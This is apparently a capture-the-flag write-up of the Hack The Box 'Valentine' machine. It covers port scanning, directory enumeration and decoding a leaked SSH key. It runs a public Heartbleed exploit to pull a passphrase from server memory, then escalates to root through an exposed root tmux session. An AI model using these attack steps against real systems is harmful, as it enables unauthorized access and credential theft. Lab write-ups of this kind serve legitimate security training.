## Default Information
IP Address : 10.10.10.79\
OS: Linux

## Enumeration

First, let's add the IP address and the host to our ```/etc/hosts``` file. 

```
10.10.10.79    valentine.htb
```

## Enmeration

First, we will try to discover the endpoints related to http://valentine.htb using gobuster

```
┌──(kali㉿kali)-[~]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.10.79 --rate=1000 -e tun0                1 ⨯
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-10-01 04:16:41 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 22/tcp on 10.10.10.79                                     
Discovered open port 443/tcp on 10.10.10.79                                    
Discovered open port 80/tcp on 10.10.10.79  
```

With the open ports, we will scan them using Nmap to discover the services behind each of the open ports

```
| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 22	| SSH |OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0) | Open |
| 80	| http | Apache httpd 2.2.22 ((Ubuntu)) | Open |
| 443	| ssl/http | Apache httpd 2.2.22 ((Ubuntu)) | Open |
```

## Discovery

First we will use Gobuster to enumerate all the possible endpoints on http://valentine.htb. From the output, we were able to discover some interesting endpoints such as 
```/encode```, ```/decode``` and ```/dev```

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://valentine.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -t 50 -z
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://valentine.htb/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/10/01 00:17:06 Starting gobuster in directory enumeration mode
===============================================================
http://valentine.htb/index                (Status: 200) [Size: 38]
http://valentine.htb/dev                  (Status: 301) [Size: 312] [--> http://valentine.htb/dev/]
http://valentine.htb/encode               (Status: 200) [Size: 554]                                
http://valentine.htb/decode               (Status: 200) [Size: 552]                                
http://valentine.htb/omg                  (Status: 200) [Size: 153356]                             
http://valentine.htb/server-status        (Status: 403) [Size: 294]  
```

Next, we will try to discover possible Vhosts on the target site using Gobuster, but we were unable to discover anything much of interest. 

Now, we will try to look at the ```/encode``` and ```/decode``` endpoints. There doesn't seem to have any potential vulnerabilities that could be exploited.

We will then move on to the ```/dev``` endpoint. This endpoint shows a directory lising containing 2 files. Notes.txt seems to be the personal notes of the developer, but 
hype_key file seems to contain hex-encoded data, in the text format. We will download this file into our local machine and decode it.

Based on the filename of the key, we can guess that this key belongs to a user named ```hype```. After decoding the file, we realize that this is an RSA private key file. We will then save the file on our local machine and attempt to SSH into using the key file. However, we 
realize that we need a passphrase to gain access to the SSH terminal. At the same time, we also realize that this file is encrypted, so we probably will have to decrypt it 
to be able to gain access into the SSH terminal as well. 

```
┌──(kali㉿kali)-[~/Desktop]
└─$ cat hype_key | xxd -r -p > id_rsa                                               1 ⚙
                                                                                        
┌──(kali㉿kali)-[~/Desktop]
└─$ chmod 600 id_rsa                                                                1 ⚙
                                                                                        
┌──(kali㉿kali)-[~/Desktop]
└─$ ssh -i id_rsa hype@10.10.10.79                                                       1 ⚙
Enter passphrase for key 'id_rsa':
```

Now, we will try to scan for vulnerabilities in the SSH terminal that may possibly reveal the passphrase using Nmap

```
| ssl-ccs-injection: 
|   VULNERABLE:
|   SSL/TLS MITM vulnerability (CCS Injection)
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
|       does not properly restrict processing of ChangeCipherSpec messages,
|       which allows man-in-the-middle attackers to trigger use of a zero
|       length master key in certain OpenSSL-to-OpenSSL communications, and
|       consequently hijack sessions or obtain sensitive information, via
|       a crafted TLS handshake, aka the "CCS Injection" vulnerability.
|           
|     References:
|       http://www.cvedetails.com/cve/2014-0224
|       http://www.openssl.org/news/secadv_20140605.txt
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|           
|     References:
|       http://www.openssl.org/news/secadv_20140407.txt 
|       http://cvedetails.com/cve/2014-0160/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
| ssl-poodle: 
|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  CVE:CVE-2014-3566  BID:70574
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
|           products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the "POODLE" issue.
|     Disclosure date: 2014-10-14
|     Check results:
|       TLS_RSA_WITH_AES_128_CBC_SHA
|     References:
|       https://www.openssl.org/~bodo/ssl-poodle.pdf
|       https://www.imperialviolet.org/2014/10/14/poodle.html
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
|_      https://www.securityfocus.com/bid/70574
|_sslv2-drown: 
```

Lookign at the possible vulnerabilities, CCS injection seems unlikely as this is a MITM attack. I was unable to make sense of the SSL Poddle attack and how it actually worked. So, 
let's start with hearblled attack first since this is the more commonly-used exploit. 

```
┌──(kali㉿kali)-[~/Desktop]
└─$ searchsploit heartbleed
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                    |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenSSL 1.0.1f TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure (Multiple SSL/TLS Versions)                                                                               | multiple/remote/32764.py
OpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (1)                                                                                                               | multiple/remote/32791.c
OpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (2) (DTLS Support)                                                                                                | multiple/remote/32998.c
OpenSSL TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure                                                                                                                  | multiple/remote/32745.py
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
──(kali㉿kali)-[~/Desktop]
└─$ python 32764.py 10.10.10.79
Trying SSL 3.0...
Connecting...
Sending Client Hello...
Waiting for Server Hello...
 ... received message: type = 22, ver = 0300, length = 94
 ... received message: type = 22, ver = 0300, length = 885
 ... received message: type = 22, ver = 0300, length = 331
 ... received message: type = 22, ver = 0300, length = 4
Sending heartbeat request...
 ... received message: type = 24, ver = 0300, length = 16384
Received heartbeat response:
  0000: 02 40 00 D8 03 00 53 43 5B 90 9D 9B 72 0B BC 0C  .@....SC[...r...
  0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .+..H...9.......
  0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....".
  0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.
  0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0  ................
  0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00  ............3.2.
  0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00  ....E.D...../...
  0070: 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00  A...............
  0080: 12 00 09 00 14 00 11 00 08 00 06 00 03 00 FF 01  ................
  0090: 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00  ..I...........4.
  00a0: 32 00 0E 00 0D 00 19 00 0B 00 0C 00 18 00 09 00  2...............
  00b0: 0A 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00  ................
  00c0: 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0F 00  ................
  00d0: 10 00 11 00 23 00 00 00 0F 00 01 01 30 2E 30 2E  ....#.......0.0.
  00e0: 31 2F 64 65 63 6F 64 65 2E 70 68 70 0D 0A 43 6F  1/decode.php..Co
  00f0: 6E 74 65 6E 74 2D 54 79 70 65 3A 20 61 70 70 6C  ntent-Type: appl
  0100: 69 63 61 74 69 6F 6E 2F 78 2D 77 77 77 2D 66 6F  ication/x-www-fo
  0110: 72 6D 2D 75 72 6C 65 6E 63 6F 64 65 64 0D 0A 43  rm-urlencoded..C
  0120: 6F 6E 74 65 6E 74 2D 4C 65 6E 67 74 68 3A 20 34  ontent-Length: 4
  0130: 32 0D 0A 0D 0A 24 74 65 78 74 3D 61 47 56 68 63  2....$text=aGVhc
  0140: 6E 52 69 62 47 56 6C 5A 47 4A 6C 62 47 6C 6C 64  nRibGVlZGJlbGlld
  0150: 6D 56 30 61 47 56 6F 65 58 42 6C 43 67 3D 3D 7D  mV0aGVoeXBlCg==}
  0160: 74 63 2C C1 63 71 6E 0F 2C 84 31 A1 3D 02 94 C9  tc,.cqn.,.1.=...
WARNING: server returned more data than it should - server is vulnerable!
```

From the output,we realize that we have an encoded text ```$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==}``` that seems to be base-64 encoded. We will first try to decode the text

```
┌──(kali㉿kali)-[~/Desktop]
└─$ echo -n "aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==" | base64 -d                  1 ⨯ 4 ⚙
heartbleedbelievethehype
```

## Obtaining user flag

The decoded might be the passphrase for the private key. Let's try to SSH in with this passphrase.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ ssh -i id_rsa hype@10.10.10.79                                                  4 ⚙
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3
hype@Valentine:~$ 
```

Now, all we have to do is to find the user.txt and obtain the flag

```
hype@Valentine:~$ cd Desktop
hype@Valentine:~/Desktop$ ls
user.txt
hype@Valentine:~/Desktop$ cat user.txt
<Redacted user flag>
```

## Obtaining root flag

Now, we will use linpeas to discover potential vectors of privilege escalation. From the outputt, we discover that there is a tmux session that is current running, and this process is owned by root

```
╔══════════╣ Searching tmux sessions
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions       
                                                                                        
root       1034  0.0  0.1  26416  1676 ?        Ss   21:21   0:03 /usr/bin/tmux -S /.devs/dev_sess   
```

Looking at the bash history, we can also see that tmux command has been executed, and there is an existing session of ```dev_sess``` running. All we have to do is to simply 
attach a new tmux process to the existing process of ```dev_sess```, and we will obtain a root shell.

```
hype@Valentine:~/Desktop$ tmux -S /.devs/dev_sess
root@Valentine:/home/hype# cd /root
root@Valentine:~# ls
curl.sh  root.txt
root@Valentine:~# cat root.txt
<Redacted root flag>
root@Valentine:~#
```
